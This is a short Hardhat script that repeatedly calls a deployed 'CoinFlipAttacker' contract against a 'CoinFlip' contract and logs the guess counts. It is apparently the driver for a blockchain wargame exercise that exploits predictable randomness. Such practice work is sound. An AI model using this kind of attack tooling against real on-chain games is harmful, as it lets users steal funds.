import { ethers } from "hardhat";

async function main() {

    const coinFlipAttackerAddress = "0x3f71237d8418d61F669f64544735beB1368150b7";
    const coinFlipAddress = "0x407Ee721609F2c5528efF3e0fbdebd330f29882a"

    const signers = await ethers.getSigners();

    // Replace `1` with the index of the signer you want to use (signers array is 0-indexed)
    const signer = signers[0];

    console.log("Using signer with address:", await signer.getAddress());

    const coinFlipAttacker = await ethers.getContractAt("CoinFlipAttacker", coinFlipAttackerAddress, signer);



    let consecutiveGuesses = undefined;
    while(consecutiveGuesses == undefined) {
    const tx = await coinFlipAttacker.coinFlipGuess(coinFlipAddress);
    console.log("Transaction hash:", tx.hash);
    console.log("Waiting for transaction to be mined...");
    const receipt = await tx.wait();
    const event = receipt.events?.find((e) => e.event === "Guesses");
    const args = event?.args;
    console.log("Guesses:", args?.guesses.toString());
    consecutiveGuesses = args?.guesses;

    }

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
